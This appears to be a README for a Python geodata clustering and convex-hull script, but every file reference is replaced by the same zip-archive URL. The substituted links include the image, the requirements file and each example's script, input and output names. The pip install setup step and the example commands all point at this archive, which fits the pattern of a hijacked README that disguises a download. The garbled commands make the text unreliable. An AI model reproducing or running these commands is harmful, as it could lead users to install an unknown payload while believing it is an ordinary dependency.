clustexer (clustering + convex hull)
=========

### Introduction

Visualize your clustered geodata!
Clustexer is a script for K-Means clustering geodata and generating convex hulls of the clusters to CSV/Google Maps HTML

This script is used to:
* cluster data with k-means
* calculate convex hull
* display convex hulls as polygons on google maps in HTML with index labels
* generated google maps are automatically bounded to show all the polygons
 
Given some sexy data, your convex hulls will be viewable and labeled on google maps as such:
![NY Clusters](https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip)


### Setup

Install the dependencies with:
    
    pip install -r https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip


### Data Format

Data should come in the formats:

    lat, lng, cluster_index

    OR

    lat, lng
    >> In this case, specify the k for clustering with --num-clusters


### Examples

Example usage to get convex hull polygons to stdout from clustered input:

    python https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip
*Convex Hull Format: neighborhood_index,lat1 lng1; lat2 lng2; lat3 lng3*

***

Example usage to get convex hulls to stdout from clustered input with label:

    python https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip --cluster-prefix marin
*Convex Hull Format: label, neighborhood_index,lat1 lng1; ...*

***

Example usage to get convex hulls polygons to stdout from unclustered data:

    python https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip --num-clusters 15

***

Example usage to output convex hulls to html from clustered data:

    python https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip --html https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip

***

Example usage to get convex hull points from clustered data:

    python https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip --cluster-prefix marin
*Outputs to a file called https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip*

***

Example usage to get convex hulls from unclustered data to html:

    python https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip --html https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip --num-clusters 15

***

Example usage to get convex hulls from unclustered data to html and save shapes to file:

    python https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip --html https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip --num-clusters 15 --cluster-prefix marin
*Outputs convex hulls to a file called https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip*
